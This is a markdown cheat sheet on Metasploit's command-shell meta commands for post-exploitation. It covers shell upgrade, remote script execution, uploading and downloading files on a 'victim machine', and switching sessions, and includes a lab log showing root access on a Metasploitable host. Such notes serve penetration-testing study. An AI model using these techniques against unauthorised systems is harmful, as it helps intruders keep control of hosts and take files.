# Usage

Search Tag: #metasploit-framework #command-and-control #living-off-the-land

## 01 - Help Menu

```
help

Meta shell commands
===================

    Command     Description
    -------     -----------
    help        Help menu
    background  Backgrounds the current shell session
    sessions    Quickly switch to another session
    resource    Run a meta commands script stored in a local file
    shell       Spawn an interactive shell (*NIX Only)
    download    Download files
    upload      Upload files
    source      Run a shell script on remote machine (*NIX Only)
    irb         Open an interactive Ruby shell on the current session
    pry         Open the Pry debugger on the current session
```

## 02 - Interactive Meta Shell

### 2.1 - Help Menu

```
help shell
Usage: shell

Pop up an interactive shell via multiple methods.
An interactive shell means that you can use several useful commands like `passwd`, `su [username]`
There are four implementations of it: 
\t1. using python `pty` module (default choice)
\t2. using `socat` command
\t3. using `script` command
\t4. upload a pty program via reverse shell
```

### 2.2 - Usage

```
[*] Command shell session 1 opened (10.0.2.4:34869 -> 192.168.56.106:6200 ) at 2022-03-29 03:43:52 -0400

shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
root@metasploitable:/# id
id
uid=0(root) gid=0(root)
root@metasploitable:/#
```

## 03 - Source Script

### 3.1 - Help Menu

```
help source
Usage: source [file] [background]

Execute a local shell script file on remote machine
This meta command will upload the script then execute it on the remote machine

background
`y` represent execute the script in background, `n` represent on foreground
```

### 3.2 - Usage

```
source script.sh <y | n>
```

## 04 - Upload and Download

### 4.1 -  Help Menu

- Upload

```
help upload
Usage: upload [src] [dst]

Uploads load file to the victim machine.
This command does not support to upload a FOLDER yet
```

- Download

```
help download
Usage: download [src] [dst]

Downloads remote files to the local machine.
Only files are supported.
```

### 4.2 - Usage

- Upload

```
upload /path/to/local/file /path/to/remote/file
```

- Download

```
download /path/to/remote/file /path/to/local/file
```

## 05 - Switch Interactive Sessions

### 5.1 - Help Menu

```
help sessions
Usage: sessions <id>

Interact with a different session Id.
This command only accepts one positive numeric argument.
This works the same as calling this from the MSF shell: sessions -i <session id>
```

### 5.2 - Usage

```
sessions <session_id>
```

## 06 - Background Session

`background`

## 07 - Resource Script to Automate Commands

### 7.1 - Help Menu

```
help resource
Usage: resource path1 [path2 ...]

Run the commands stored in the supplied files. (- for stdin, press CTRL+D to end input from stdin)
Resource files may also contain ERB or Ruby code between <ruby></ruby> tags.
```

### 7.2 - Usage

```
resource /path/to/local/resource.rc
```

## 08 - Interactive Ruby Session

TODO: Fill this info

### 8.1 - Help Menu

```
help irb
```

### 8.2 - Usage

```
irb
```

## 09 - Debug Current Session

### 9.1 - Help Menu

```
help pry
```

### 9.2 - Usage

```
pry
```